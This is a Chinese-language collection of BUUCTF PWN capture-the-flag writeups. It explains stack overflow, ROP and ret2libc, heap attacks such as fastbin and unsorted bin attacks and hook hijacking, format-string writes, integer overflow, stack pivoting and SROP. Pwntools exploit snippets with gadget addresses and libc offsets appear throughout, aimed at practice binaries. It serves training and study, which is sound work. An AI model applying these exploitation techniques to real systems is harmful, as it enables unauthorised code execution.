---
title: BUUCTF PWN 方向 Writeup 集合
description: BUUCTF 靶场 PWN 方向多道题目完整 Writeup 集合，涵盖栈溢出、ROP、ret2libc、堆利用、格式化字符串、整数溢出、栈迁移、SROP
  等核心二进制漏洞利用技术，附完整 Exp 代码与调试分析。
category: program-analysis
tags:
- BUUCTF
- PWN
- Binary Exploitation
- Stack Overflow
- ROP
- ret2libc
- Heap Exploitation
- Format String
- Integer Overflow
- Stack Pivoting
- SROP
- CTF Writeup
date: 2024-01-15
updated: '2026-11-14'
---

# BUUCTF PWN 方向 Writeup 集合

> 原文来源：无名安全团队 - AI0nez，微信公众号归档文章《BUUCTF靶场 - PWN刷题》
> 适用平台：BUUCTF (node3.buuoj.cn) 及本地复现环境

本页面系统整理 BUUCTF PWN 方向经典题目的漏洞分析、利用思路与完整 Exp 代码，涵盖 **栈溢出**、**ROP 链构造**、**ret2libc**、**堆利用**、**格式化字符串**、**整数溢出**、**栈迁移**、**SROP** 等核心二进制漏洞利用技术。所有题目均可在 BUUCTF 靶场找到对应端口进行实战练习。

---

## 核心技术知识体系交叉引用

- [[rop-linux-x86-beginner-tutorial]] — ROP 攻击入门核心知识：栈溢出原理、x86/x64 参数传递差异、保护机制（ASLR/NX/PIE/Canary）、偏移定位、Shellcode 构造与实战利用流程
- [[heap-overflow-principles-unlink-exploitation]] — 堆内存布局、空闲链表管理、前向/后向指针机制，及经典 Unlink 攻击利用链
- [[peda-buffer-overflow-analysis-guide]] — PEDA 插件在 Linux 环境下的缓冲区溢出漏洞分析全流程：pattern_create/pattern_search 精准定位偏移量、ROP 链构造
- [[mtctf-2021-pwn-writeup]] — MTCTF 2021 堆利用题目详细解析：UAF、Fastbin Consolidation、Unlink、Double Free、setcontext+mprotect 执行 Shellcode
- [[xihulunjian-2020-iot-pwn3-ezarmpwn-writeup]] — 32 位 ARM 程序栈溢出、UAF、Off-by-null、ROP 利用、Double Free 与 Chunk Overlap 堆利用方式
- [[0w1club-week11-crypto-re-pwn-training]] — 0w1Club 2018 年第十一周线下赛前培训内容，涵盖 PWN 入门题型概览

---

## 题目分类索引

| 题目 | 分类 | 核心技术点 | 难度 |
|------|------|------------|------|
| jarvisoj_level0 | 栈溢出 | 直接覆盖返回地址调用 `callsystem` | ⭐ |
| jarvisoj_level2 / level2_x64 | 栈溢出 + ret2libc | 32/64 位 ROP 调用 `system("/bin/sh")` | ⭐⭐ |
| babyrop / babyrop2 / bjdctf_2020_babyrop | ROP + ret2libc | 64 位 ROP 链泄露 libc、one_gadget | ⭐⭐ |
| babystack / bjdctf_2020_babystack2 | 栈溢出 + 整数溢出 | 无长度检查、负数绕过长度限制 | ⭐⭐ |
| ciscn_2019_n_5 / ciscn_2019_ne_5 / ciscn_s_3 | 栈溢出 + SROP / 栈迁移 | syscall 调用、`__libc_csu_init` gadget、栈迁移 | ⭐⭐⭐ |
| babyheap_0ctf_2017 / vn_pwn_simpleHeap / ZJCTF_2019_EasyHeap | 堆利用 | Unsorted Bin Attack、Fastbin Attack、Off-by-One、Chunk Extend、realloc_hook/malloc_hook 劫持 | ⭐⭐⭐⭐ |
| babyfengshui_33c3_2016 | 堆利用 + UAF | 堆块重叠、free_hook 劫持为 system | ⭐⭐⭐ |
| hitcontraining_uaf | UAF | Use-After-Free 覆盖函数指针调用后门 | ⭐⭐ |
| ciscn_2019_es_2 / Black_Watch | 栈迁移 | leave; ret gadget、BSS 段迁移、泄露栈地址 | ⭐⭐⭐ |
| jarvisoj_fm | 格式化字符串 | `%n` 任意地址写、修改全局变量 | ⭐⭐ |
| pwn2_sctf_2016 / 2018_rop / picoctf_2018_rop_chain | 栈溢出 + 整数溢出 + ROP | 负数绕过长度检查、write/printf 泄露 libc、ret2libc | ⭐⭐ |
| jarvisoj_level3 / level3_x64 / jarvisoj_level4 | 栈溢出 + ret2libc | 延迟绑定、GOT 表泄露、多次 ROP 链 | ⭐⭐ |
| jarvisoj_tell_me_something / ez_pz_hackover_2016 | 栈溢出 | NX 关闭、RWX 段、直接跳转 Shellcode | ⭐ |
| others_shellcode | Shellcode | 连接即得 Flag | ⭐ |
| bjdctf_2020_babyrop2 | 格式化字符串 + 栈溢出 | `%p` 泄露 Canary、绕过 Canary 保护 | ⭐⭐⭐ |

---

## 详细 Writeup

### jarvisoj_level0 — 最基础栈溢出

**文件保护**：`amd64`、`No RELRO`、`No Canary`、`NX Enabled`、`No PIE`

**漏洞点**：`vulnerable_function` 中 `read(0, &buf, 0x200)` 栈缓冲区仅 `0x80` 字节，存在栈溢出。

**利用方式**：直接覆盖返回地址为 `callsystem` 函数地址 (`0x400596`)，该函数调用 `system("/bin/sh")`。

**Exp 关键代码**：

```python
from pwn import *
sh = remote('node3.buuoj.cn', 27943)
flag_addr = 0x400596
payload = b'a' * 0x88 + p64(flag_addr)
sh.recvuntil(b'Hello, World\n')
sh.sendline(payload)
sh.interactive()
```

---

### jarvisoj_level2 (32位) / level2_x64 (64位) — ret2libc 经典

**32 位保护**：`i386`、`Partial RELRO`、`No Canary`、`NX Enabled`、`No PIE`

**64 位保护**：`amd64`、`No RELRO`、`No Canary`、`NX Enabled`、`No PIE`

**漏洞点**：`vulnerable_function` 中 `read(0, &buf, 0x100)` 栈缓冲区仅 `0x80` 字节。

**利用方式**：
- **32 位**：参数通过栈传递，构造 `system_plt + 返回地址占位 + /bin/sh 地址`
- **64 位**：参数通过寄存器传递 (`RDI`)，需寻找 `pop rdi; ret` gadget

**关键 Gadget (64位)**：
- `pop_rdi_ret = 0x4006b3`
- `bin_sh_addr = 0x600A90`
- `call_system = 0x400603`

**Exp 关键代码 (64位)**：

```python
pop_ret = 0x4006b3
bin_sh_addr = 0x600A90
call_system = 0x400603
payload = b'a' * 0x80 + b'a' * 0x8 + p64(pop_ret) + p64(bin_sh_addr) + p64(call_system)
```

---

### babyrop / babyrop2 / bjdctf_2020_babyrop — 64 位 ROP + ret2libc

**保护**：`amd64`、`Partial RELRO`、`No Canary`、`NX Enabled`、`No PIE`

**漏洞点**：
- `babyrop`：`scanf("%s", &v4)` 无长度限制，栈溢出覆盖返回地址
- `babyrop2` / `bjdctf_2020_babyrop`：同理，需先泄露 libc 基址

**利用流程**：
1. 构造 ROP 链：`pop rdi; ret` + `puts_got` + `puts_plt` + `main` 返回重复利用
2. 泄露 `puts` 真实地址，计算 `libc_base`
3. 查找 `one_gadget` 或 `system + /bin/sh` 发起二次攻击

**关键 Gadget (babyrop2)**：
- `pop_rdi_ret = 0x400733`
- `pop_rsi_r15_ret = 0x400731`
- `format_addr = 0x400790` (格式化字符串 `%s` 用于泄露)

**Exp 核心逻辑**：

```python
# 第一次泄露 libc
payload = b'a' * 0x28 + p64(pop_rdi_ret) + p64(format_addr) + \
          p64(pop_rsi_r15_ret) + p64(read_got) + p64(0) + \
          p64(printf_plt) + p64(main_addr)

# 计算 libc_base 后二次攻击
one_gadget = libc_base + 0xf02a4
payload2 = b'a' * 0x28 + p64(one_gadget)
```

---

### babystack / bjdctf_2020_babystack2 — 栈溢出 + 整数溢出

**保护**：`amd64`、`Partial RELRO`、`No Canary`、`NX Enabled`、`No PIE`

**babystack 漏洞点**：`read(0, &buf, nbytes)` 且 `nbytes` 由用户可控 `scanf("%d", &nbytes)`，无上界检查。

**bjdctf_2020_babystack2 漏洞点**：`nbytes` 为有符号整数，输入 `-1` 触发整数溢出，`read` 长度变为巨大无符号数，导致栈溢出。

**利用方式**：直接覆盖返回地址为 `backdoor` 函数 (`0x4006E6` / `0x400726`)。

**Exp 关键代码 (babystack2)**：

```python
payload = b'a' * 0x10 + b'a' * 8 + p64(backdoor)
sh.sendline(b'-1')  # 整数溢出绕过长度检查
sh.sendline(payload)
```

---

### ciscn_2019_n_5 — 64 位 ret2libc + one_gadget (libc-2.27)

**保护**：`amd64`、`Partial RELRO`、`No Canary`、`NX Disabled`、`No PIE`、**`RWX Segments`**

**漏洞点**：`gets` 函数无长度限制，栈溢出。

**利用流程**：
1. ROP 泄露 `puts_got` 真实地址
2. 使用 `libc-2.27.so` 计算 `libc_base`
3. `one_gadget = libc_base + 0x4f2c5` 直接 getshell

**注意**：远程环境 libc 版本为 2.27，需准备对应 libc 文件。

---

### ciscn_2019_ne_5 — 32 位栈溢出 + 静态分析汇编

**保护**：`i386`、`Partial RELRO`、`No Canary`、`NX Enabled`、`No PIE`

**特殊点**：`main` 函数无法 F5 反编译，需阅读汇编。通过 ROPgadget 找到 `/bin/sh` 字符串地址 `0x080482EA`。

**利用方式**：标准 32 位 ret2libc，`system_plt + 返回地址占位 + bin_sh_addr`。

---

### ciscn_s_3 — SROP (Sigreturn Oriented Programming) 经典案例

**保护**：`amd64`、`Partial RELRO`、`No Canary`、`NX Enabled`、`No PIE`

**核心机制**：程序直接使用 `syscall` 指令实现 `read` 和 `write`，且提供 `mov rax, 0x3B; ret` gadget (即 `execve` 系统调用号)。

**漏洞分析**：
- `vuln` 函数仅 `push rbp; mov rbp, rsp`，栈帧极小
- `read(0, rsp+var_10, 0x400)` 可大量溢出栈
- 利用 `__libc_csu_init` 中的万能 gadget 控制 `RDX, RSI, RDI`

**关键 Gadget**：
```
__libc_csu_init (gadget_one = 0x40059A):
  pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret

__libc_csu_init (gadget_two = 0x400580):
  mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]
```

**利用流程**：
1. 第一次输入泄露栈地址，计算 `/bin/sh\x00` 在栈上的位置
2. 第二次输入构造完整 SROP 链：
   - 通过 `gadget_one` 设置寄存器
   - 通过 `gadget_two` 调用 `mov rax, 0x3B; ret` (地址写在栈上)
   - 最终 `execve("/bin/sh", 0, 0)`

**Exp 核心构造**：

```python
# 第一次泄露栈地址
payload1 = b'/bin/sh\x00' + b'a'*8 + p64(vuln_addr)

# 第二次 SROP 链
payload2 = b'/bin/sh\x00' + b'a'*8 + \
           p64(mov_rax_ret) + p64(gadget_one) + p64(0) + p64(1) + \
           p64(mov_rax) + p64(0) + p64(0) + p64(0) + \
           p64(gadget_two) + b'a'*56 + \
           p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(syscall_addr)
```

---

### babyheap_0ctf_2017 — 堆利用综合实战 (Unsorted Bin Attack + Fastbin Attack)

**保护**：`amd64`、**`Full RELRO`**、**`Canary Found`**、**`NX Enabled`**、**`PIE Enabled`**

**漏洞点**：`edit` 函数允许输入任意 `size`，导致堆溢出。

**利用链**：
1. **Unsorted Bin Attack 泄露 libc**：
   - 释放 chunk1 进入 unsorted bin
   - 溢出修改 chunk0 的 size，使 chunk1 被合并为更大 chunk
   - 重新申请 chunk1，再次释放 chunk2 进入 unsorted bin
   - `show` 泄露 `main_arena` 地址，计算 `libc_base`

2. **Fastbin Attack 劫持 `__malloc_hook`**：
   - 申请 fastbin 大小 chunk，释放构造 fastbin 链表
   - 修改已释放 chunk 的 `fd` 指向 `__malloc_hook - 0x23` (构造 fake chunk)
   - 两次 `malloc` 拿到 `__malloc_hook` 附近内存
   - 写入 `one_gadget` 覆盖 `__malloc_hook`
   - 触发 `malloc` 执行 `one_gadget`

**关键偏移 (libc-2.23)**：
- `main_arena_offset = 0x3c4b20`
- `malloc_hook_offset = 0x3c4b10`
- `one_gadget_offset = 0x4526a` (需满足约束条件)

**Exp 核心步骤**：

```python
# 1. Unsorted Bin Attack 泄露 libc
free(1)
edit(0, 0xa0, b'a'*0x90 + p64(0) + p64(0x141))
add(0x130)  # chunk1 合并
edit(1, 0xa0, b'a'*0x90 + p64(0) + p64(0xa1))
free(2)
show(1)  # 泄露 main_arena

# 2. Fastbin Attack 劫持 malloc_hook
fake_size = malloc_hook - 0x23
edit(4, 0x28, b'a'*0x10 + p64(0) + p64(0x71) + p64(fake_size))
add(0x60)  # chunk5
add(0x60)  # chunk7 落在 malloc_hook 附近
edit(7, 0x1b, b'a'*3 + p64(one_gadget)*3)
add(0x10)  # 触发 malloc -> one_gadget
```

---

### vn_pwn_simpleHeap (V&N2020 公开赛 simpleHeap) — Off-by-One + Chunk Extend + realloc_hook/malloc_hook 劫持

**保护**：`amd64`、**`Full RELRO`**、**`Canary Found`**、**`NX Enabled`**、**`PIE Enabled`**

**漏洞点**：`edit` 函数存在 **Off-by-One** 溢出，可修改下一个 chunk 的 `prev_inuse` 位及 `size` 字段。

**利用链**：
1. **Chunk Extend 造成堆块重叠**：
   - 申请 chunk0(0x18), chunk1(0x68), chunk2(0x68), chunk3(0x10)
   - Off-by-One 修改 chunk1 的 size 为 `0xe1` (prev_inuse=1, size=0xe0)
   - `free(chunk1)` 触发合并，chunk0+chunk1 合并为大 chunk
   - 重新申请 chunk1(0x68)，此时 chunk1 与 chunk2 重叠
   - `show(chunk2)` 泄露 `main_arena` -> `libc_base`

2. **Fastbin Attack 劫持 `__realloc_hook` 与 `__malloc_hook`**：
   - 释放 chunk3, chunk2 构造 fastbin
   - 修改 chunk4 的 `fd` 指向 `__malloc_hook - 0x23`
   - 申请 chunk2, chunk3 落在 hook 附近
   - 写入：`one_gadget` 到 `__realloc_hook`，`realloc+0xd` (对齐栈) 到 `__malloc_hook`
   - 触发 `malloc` -> 调用 `__malloc_hook` -> `realloc` -> `__realloc_hook` -> `one_gadget`

**关键技巧**：
- 利用 `realloc` 调整栈结构满足 `one_gadget` 约束 (`rsp+0x50` 可控)
- `__realloc_hook` 在 `__malloc_hook` 之前，先被调用

---

### ZJCTF 2019 EasyHeap — 堆溢出 + free_hook 劫持

**保护**：`amd64`、`Partial RELRO`、`Canary Found`、`NX Enabled`、`No PIE`

**漏洞点**：`edit` 函数未检查输入 `size`，可溢出修改下一个 chunk 的元数据。

**利用链**：
1. 申请 chunk0(0x20, 内容 `/bin/sh\x00`), chunk1(0x60), chunk2(0x60)
2. 释放 chunk2, chunk1 构造 fastbin
3. 溢出 chunk0 修改 chunk1 的 `fd` 指向 `fake_chunk` (BSS 段可控地址)
4. 申请 chunk1, chunk2，chunk2 分配在 `fake_chunk`
5. 在 `fake_chunk` 中写入 `free_got` 地址
6. 再次编辑 chunk0 将 `free_got` 改为 `system_plt`
7. `free(chunk0)` 触发 `system("/bin/sh")`

**关键地址**：
- `fake_chunk = 0x6020b5` (BSS 段)
- `free_got = elf.got['free']`
- `system_plt = elf.plt['system']`

---

### babyfengshui_33c3_2016 — UAF + 堆块重叠 + free_hook 劫持

**保护**：`i386`、`Partial RELRO`、`Canary Found`、`NX Enabled`、`No PIE`

**漏洞逻辑**：
- 结构体：`ptr[i] = {description_ptr, name_ptr}`
- `edit` 检查：`description + input_size < name_ptr` (防止覆盖 name)
- 通过申请两次、释放第一次、再申请大 chunk，制造 `description[1]` 与 `name[1]` 间隙

**利用链**：
1. 申请 0, 1 (小 chunk)
2. `free(0)` -> 申请大 chunk(0x80) 占据 0 的位置，导致 `description[1]` 指向可控区域
3. `edit(2)` 溢出修改 `name[1]` 的 `description_ptr` 为 `free_got`
4. `show(1)` 泄露 `free` 真实地址 -> `libc_base` -> `system`
5. 申请 chunk3 (`/bin/sh\x00`)
6. `edit(1)` 将 `free_got` 改为 `system`
7. `free(3)` 触发 `system("/bin/sh")`

---

### hitcontraining_uaf — 经典 UAF (Use-After-Free)

**保护**：`i386`、`Partial RELRO`、`No Canary`、`NX Enabled`、`No PIE`

**程序逻辑**：笔记本程序，`add`/`free`/`show`，结构体含函数指针。

**漏洞点**：`free` 后未置空指针，`show` 调用已释放对象的虚函数/函数指针。

**利用方式**：
1. 申请两个 note
2. 全部释放，fastbin 中有两个可控 chunk
3. 重新申请小 chunk，内容覆盖为 `magic` 后门函数地址 (`0x08048945`)
4. `show` 触发调用后门

---

### ciscn_2019_es_2 / Black_Watch — 栈迁移 (Stack Pivoting)

**核心场景**：栈空间不足以容纳完整 ROP 链，需迁移到可控大内存区 (BSS/堆/栈其他位置)。

**ciscn_2019_es_2 利用流程**：
1. 第一次输入：溢出到 `ebp` 前，`printf` 遇 `\x00` 停止，泄露 `ebp` 地址
2. 计算栈迁移目标地址 (`ebp - 0x38`)
3. 第二次输入：构造栈帧，`leave; ret` (0x08048562) 迁移栈到可控区域
4. 迁移后栈布局：`system + 返回地址 + /bin/sh字符串指针`

**Black_Watch 利用流程**：
1. 第一次输入：写入 `write_plt + main + 1 + write_got + 4` 到 BSS 段 (`0x0804A300`)
2. 第二次输入：栈溢出覆盖 `ebp` 为 `BSS-4`，覆盖 `ret` 为 `leave; ret` (0x08048408)
3. 程序返回执行 `write` 泄露 libc
4. 第三/四次输入：同理迁移到 BSS 执行 `system("/bin/sh")`

---

### jarvisoj_fm — 格式化字符串任意地址写

**保护**：`i386`、`Partial RELRO`、**`Canary Found`**、`NX Enabled`、`No PIE`

**漏洞点**：`printf(user_input)` 直接作为格式化字符串。

**利用方式**：`%n` 写入已输出字符数到指定地址。目标修改全局变量 `x` (0x0804A02C) 为 4。

**偏移确定**：第 11 个参数为栈上可控地址。

**Exp**：

```python
x_addr = 0x0804A02C
payload = p32(x_addr) + b'%11$n'
```

---

### pwn2_sctf_2016 / 2018_rop / picoctf_2018_rop_chain — 整数溢出 + 标准 ret2libc

**pwn2_sctf_2016 关键点**：
- `read_size` 为有符号 int，输入 `-1` -> `read` 长度变 `0xFFFFFFFF`，栈溢出
- 标准 `write/printf` 泄露 libc -> `one_gadget` (libc-2.23: 0x5f066)

**2018_rop 关键点**：
- 32 位，`write` 泄露 libc，使用 `LibcSearcher` 自动查找 libc 版本

**picoctf_2018_rop_chain 关键点**：
- 32 位，`printf` 泄露 libc，格式化字符串地址硬编码 `0x080488CD`

---

### jarvisoj_level3 / level3_x64 / jarvisoj_level4 — 经典 ret2libc 进阶

**jarvisoj_level3 (32位)**：标准 `write` 泄露 libc -> `system + /bin/sh`

**level3_x64 (64位)**：
- 需 `pop rdi; ret` + `pop rsi; pop r15; ret` 设置 `write(1, write_got, 4)`
- 泄露后同理调用 `system`

**jarvisoj_level4 (32位 延迟绑定)**：
- 第一次输入 `main_addr` 作为返回地址，使程序再次运行 `main`
- 第二次输入完整 ROP 链泄露 libc
- 第三次输入 `system + /bin/sh`
- **原理**：第一次调用 `write_plt` 触发延迟绑定解析 `write`，第二次 `write_got` 已填入真实地址

---

### bjdctf_2020_babyrop2 — 格式化字符串泄露 Canary + 栈溢出

**保护**：`amd64`、`Partial RELRO`、**`Canary Found`**、`NX Enabled`、`No PIE`

**利用流程**：
1. 格式化字符串漏洞泄露栈上 Canary 值 (通常 `%13$p` 或类似偏移)
2. 栈溢出构造 payload：`padding + canary + fake_ebp + rop_chain`
3. 后续同标准 ret2libc

---

### jarvisoj_tell_me_something / ez_pz_hackover_2016 — NX 关闭 / RWX 段直接执行 Shellcode

**jarvisoj_tell_me_something**：
- `good_game` 函数直接读取 flag，覆盖返回地址即可

**ez_pz_hackover_2016**：
- **`NX Disabled`**、**`RWX Segments`**
- 栈可直接执行 Shellcode
- `lea eax, [ebp+dest]` 栈偏移 `0x32` 处可控
- 两阶段：泄露 libc -> 计算 `system` -> 返回栈上执行 Shellcode 或直接 `system("/bin/sh")`

---

### others_shellcode — 连接即得 Flag

无需漏洞利用，连接服务器直接输出 Flag。

---

## 通用调试与利用技巧总结

### 栈偏移确定方法
- **pattern_create / pattern_search** (PEDA/pwntools) ：生成唯一模式，崩溃后查找偏移
- **IDA 分析**：查看栈帧布局，`buf` 到 `rbp`/`ret` 的距离
- **动态调试**：GDB 断点 `vuln` 函数，`info frame` 查看栈地址

### libc 版本识别与泄露
- **单函数泄露**：`write/puts/printf` 泄露单个 GOT 条目，使用 `LibcSearcher` / `libc.rip` / `libc.blukat.me` 查找
- **多函数泄露**：泄露 2-3 个函数地址精确定位 libc 版本
- **远程环境**：BUUCTF 常用 `libc-2.23.so`、`libc-2.27.so`，需本地准备对应文件

### One Gadget 选择与约束满足
- 使用 `one_gadget libc.so.6` 查找可用 gadget
- 常见约束：`[rsp+0x30] == NULL`、`[rsp+0x50] == NULL`、`rcx == NULL`
- 不满足时：调整栈布局 (如 `realloc+0xd`)、使用 `setcontext`、或改用 `system("/bin/sh")`

### 堆利用核心原语
| 原语 | 适用条件 | 核心操作 |
|------|----------|----------|
| Unsorted Bin Attack | 能泄露 unsorted bin fd/bk | 修改 `bk` 指向目标地址-0x10，申请触发写入 `main_arena` 地址 |
| Fastbin Attack | 能控制 fastbin fd | 修改 `fd` 为 `target-0x23`，两次 `malloc` 拿到目标地址附近 |
| Unlink Attack | 能控制 free chunk 的 fd/bk | 伪造 chunk，`free` 触发 `fd->bk = bk; bk->fd = fd` 任意地址写 |
| Off-by-One / Chunk Extend | Off-by-null/Off-by-one 溢出 | 修改 `prev_size`/`size`，触发合并/分割造成堆块重叠 |
| House of Spirit / Force | 能控制 malloc 参数 | 伪造 fastbin chunk 头，`malloc` 返回可控地址 |

### 栈迁移关键 Gadget
- `leave; ret` : `mov rsp, rbp; pop rbp; ret` — 将栈指针迁移到 `rbp` 指向位置
- `pop rbp; ret` / `pop rsp; ret` : 直接控制 `rbp`/`rsp`
- 需配合可写可控内存区 (BSS、堆、栈其他位置)

### SROP (Sigreturn Oriented Programming) 要点
- 需控制 `RAX=15 (rt_sigreturn)` 并执行 `syscall`
- 构造完整 `sigcontext` 结构体 (所有寄存器值)
- 利用 `__libc_csu_init` 万能 gadget 批量设置寄存器
- 适用于仅有 `syscall` gadget、无 `pop rax; ret` 等情况

### 格式化字符串利用技巧
- `%n` / `%hn` / `%hhn` : 写入 4/2/1 字节
- `%<num>c` : 控制输出字符数
- `%<offset>$n` : 直接指定栈偏移写入
- 任意地址读：`%<offset>$s` (地址需在栈上或通过栈迁移放入栈上)
- 绕过 Canary：泄露 Canary 后在溢出 payload 中填回原值

### 整数溢出利用模式
- 有符号比较绕过：`if (size > MAX)` -> 输入负数通过检查，`read` 按无符号巨大值读取
- 类型转换缺陷：`size_t` vs `int`、`unsigned int` vs `signed int`
- 长度计算溢出：`len + 1` 回绕、`malloc(size * count)` 乘法溢出

---

## 学习路径建议

1. **入门阶段**：`jarvisoj_level0` → `level2`/`level2_x64` → `babyrop` → `babystack` (掌握栈溢出、ROP、ret2libc 基础)
2. **进阶阶段**：`ciscn_2019_n_5` → `jarvisoj_level3/4` → `pwn2_sctf_2016` (整数溢出、延迟绑定、多次 ROP)
3. **栈迁移/SROP**：`ciscn_2019_es_2` → `Black_Watch` → `ciscn_s_3` (栈空间受限、SROP 复杂利用)
4. **堆利用专题**：`hitcontraining_uaf` → `babyfengshui` → `ZJCTF_EasyHeap` → `babyheap_0ctf_2017` → `vn_pwn_simpleHeap` (UAF、Fastbin、Unsorted Bin、Off-by-One、Hook 劫持)
5. **格式化字符串/Canary 绕过**：`jarvisoj_fm` → `bjdctf_2020_babyrop2`
6. **实战强化**：在 BUUCTF 靶场按难度刷题，结合 `LibcSearcher`、`one_gadget`、 `pwntools` 自动化 Exp 编写

---

## 常用工具与资源链接

| 工具/资源 | 用途 |
|-----------|------|
| `pwntools` | Exp 编写、交互、ELF/ROP/Leak 自动化 |
| `LibcSearcher` / `libc.rip` / `libc.blukat.me` | 单函数地址识别 libc 版本 |
| `one_gadget` | 查找 libc 中可直接 getshell 的 gadget |
| `ROPgadget` / `ROPper` / `pwntools.rop` | 自动搜索 ROP gadget |
| `PEDA` / `GDB` / `pwndbg` | 动态调试、内存检查、pattern 偏移 |
| `IDA Pro` / `Ghidra` / `Binary Ninja` | 静态逆向分析 |
| `checksec.sh` | 快速检查二进制保护机制 |
| `glibc-all-in-one` | 管理多版本 libc 环境 (Docker) |

---

## 交叉引用导航

- [[rop-linux-x86-beginner-tutorial]] — ROP 系统性入门教程
- [[heap-overflow-principles-unlink-exploitation]] — 堆溢出与 Unlink 攻击原理深度解析
- [[peda-buffer-overflow-analysis-guide]] — PEDA 缓冲区溢出分析实战指南
- [[mtctf-2021-pwn-writeup]] — MTCTF 2021 堆利用题目完整解析
- [[xihulunjian-2020-iot-pwn3-ezarmpwn-writeup]] — ARM/IoT 方向 PWN 实战
- [[0w1club-week11-crypto-re-pwn-training]] — 0w1Club PWN 训练资料背景
- [[attack-defense-world-master-advanced-writeup]] — 攻防世界 Web/PWN 进阶 Writeup 集合
- [[vulnhub-platform-resource-index]] — VulnHub 靶机实战资源索引 (含多 PWN 靶机)

---

> **提示**：本页面所有 Exp 代码基于原文归档整理，远程端口可能随 BUUCTF 平台更新而变更，实战时请以平台最新端口为准。建议搭建本地环境 (Docker + 对应 libc) 进行稳定复现与调试。

## 来源

- [0x00实验室-202108-202304_072](../sources/0x00实验室-202108-202304_072.md)
